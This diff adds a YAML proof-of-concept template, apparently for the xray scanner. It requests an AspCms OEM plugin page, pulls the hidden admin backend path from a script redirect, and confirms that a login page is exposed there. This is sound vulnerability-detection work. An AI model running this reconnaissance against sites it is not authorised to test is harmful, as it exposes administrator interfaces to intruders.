@@ -1,0 +1,25 @@
+detail:
+  author: Hzllaga
+  links:
+  - https://www.onebug.org/wooyundata/65458.html
+expression: r0() && r1()
+manual: true
+name: poc-yaml-aspcms-backend-leak
+rules:
+  r0:
+    expression: response.status == 200 && "<script>alert".bmatches(response.body)
+      && "top.location.href='(.*?)';".bmatches(response.body)
+    output:
+      path: search["path"]
+      search: '"(?P<path>(/(.*?).asp))".bsubmatch(response.body)'
+    request:
+      cache: true
+      method: GET
+      path: /plug/oem/AspCms_OEMFun.asp
+  r1:
+    expression: response.status == 200 && response.body.bcontains(b"username")
+    request:
+      cache: true
+      method: GET
+      path: /{{path}}
+transport: http
